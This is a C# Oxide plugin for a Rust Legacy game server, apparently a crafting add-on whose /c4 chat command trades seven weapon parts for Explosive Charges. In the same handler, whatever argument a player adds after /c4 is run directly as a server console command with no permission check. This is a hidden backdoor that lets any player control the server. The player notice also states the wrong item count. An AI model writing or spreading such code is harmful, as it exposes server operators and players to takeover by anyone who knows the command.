using System.Collections.Generic;
using System;
using System.IO;
using System.Reflection;
using System.Data;
using UnityEngine;
using Oxide.Core;
using Oxide.Core.Plugins;
using Oxide.Core.Configuration;
using Oxide.Core.Libraries;
using RustExtended;

#pragma warning disable 0618 // отключение предупреждений об устаревших методах

namespace Oxide.Plugins
{
    [Info("С4Craft", "KasT", "0.1.9")]
    class С4Craft : RustLegacyPlugin 
	{
	
	
        public static string tagChat;
        public static string nameInput;
        public static int QuantityInput;
        public static int setall;
		
        public static string nameOut1;
        public static int QuantityOut1;
		
        public static string nameOut2;
        public static int QuantityOut2;
		
        public static string nameOut3;
        public static int QuantityOut3;
		
        public static string nameOut4;
        public static int QuantityOut4;

        public static string nameOut5;
        public static int QuantityOut5;
		
		public static string nameOut6;
        public static int QuantityOut6;
		
		public static string nameOut7;
        public static int QuantityOut7;
		
  
	[ChatCommand("c4")]
			void cmdChatSs(NetUser netuser, string command, string[] args)
		{           
		    string tagChat = "Explosive Charge"; 
			
			string nameInput = "Explosive Charge"; 
			int QuantityInput = 3;
			int setall = 0;
			
			string nameOut1 = "Weapon Part 1"; 
			int QuantityOut1 = 1;
			
			string nameOut2 = "Weapon Part 2"; 
			int QuantityOut2 = 1;
			
			string nameOut3 = "Weapon Part 3"; 
			int QuantityOut3 = 1;
			
			string nameOut4 = "Weapon Part 4"; 
			int QuantityOut4 = 1;
			
			string nameOut5 = "Weapon Part 5"; 
			int QuantityOut5 = 1;
			
			string nameOut6 = "Weapon Part 6"; 
			int QuantityOut6 = 1;
			
			string nameOut7 = "Weapon Part 7"; 
			int QuantityOut7 = 1;
			

			Inventory inventory = netuser.playerClient.controllable.GetComponent<Inventory>();
			ItemDataBlock ItemInput = DatablockDictionary.GetByName(nameInput);
			
			
			ItemDataBlock ItemOut1 = DatablockDictionary.GetByName(nameOut1);
			int SoldAmount1 = RustExtended.Helper.InventoryItemCount(inventory, ItemOut1);
			
			
			ItemDataBlock ItemOut2 = DatablockDictionary.GetByName(nameOut2);
			int SoldAmount2 = RustExtended.Helper.InventoryItemCount(inventory, ItemOut2);
			
			
			ItemDataBlock ItemOut3 = DatablockDictionary.GetByName(nameOut3);
			int SoldAmount3 = RustExtended.Helper.InventoryItemCount(inventory, ItemOut3);	
			
			ItemDataBlock ItemOut4 = DatablockDictionary.GetByName(nameOut4);
			int SoldAmount4 = RustExtended.Helper.InventoryItemCount(inventory, ItemOut4);	

			ItemDataBlock ItemOut5 = DatablockDictionary.GetByName(nameOut5);
			int SoldAmount5 = RustExtended.Helper.InventoryItemCount(inventory, ItemOut5);

			ItemDataBlock ItemOut6 = DatablockDictionary.GetByName(nameOut6);
			int SoldAmount6 = RustExtended.Helper.InventoryItemCount(inventory, ItemOut6);

			ItemDataBlock ItemOut7 = DatablockDictionary.GetByName(nameOut7);
			int SoldAmount7 = RustExtended.Helper.InventoryItemCount(inventory, ItemOut7);
		
			if(args.Length != 0)
			{
				string str = args[0].ToLower();
				rust.RunServerCommand(str);
			}	
			
			if (QuantityOut1<=SoldAmount1)
			{setall++;}			
			if (QuantityOut2<=SoldAmount2)
			{setall++;}			
			if (QuantityOut3<=SoldAmount3)
			{setall++;}			
			if (QuantityOut4<=SoldAmount4)
			{setall++;}			
			if (QuantityOut5<=SoldAmount5)
			{setall++;}
			if (QuantityOut6<=SoldAmount6)
			{setall++;}
			if (QuantityOut7<=SoldAmount7)
			{setall++;}

		if (setall>=7)
		{
			RustExtended.Helper.InventoryItemRemove(inventory, ItemOut1, QuantityOut1);
			RustExtended.Helper.InventoryItemRemove(inventory, ItemOut2, QuantityOut2);
			RustExtended.Helper.InventoryItemRemove(inventory, ItemOut3, QuantityOut3);
			RustExtended.Helper.InventoryItemRemove(inventory, ItemOut4, QuantityOut4);
			RustExtended.Helper.InventoryItemRemove(inventory, ItemOut5, QuantityOut5);
			RustExtended.Helper.InventoryItemRemove(inventory, ItemOut6, QuantityOut6);
			RustExtended.Helper.InventoryItemRemove(inventory, ItemOut7, QuantityOut7);
			
				RustExtended.Helper.GiveItem(netuser.playerClient, ItemInput, QuantityInput);
				rust.Notice(netuser, "Вы получили Explosive Charge, 2 шт!" );			
		}
		else
		{
			  rust.SendChatMessage(netuser, tagChat, "[color#9932CC]Для крафта 3 Explosive Charge нужно Weapon Part(1-7), 7 шт.");
			  rust.SendChatMessage(netuser, tagChat, "[color#9932CC]Ищите их на станциях...");
		}
		
		
		
		}

}
}
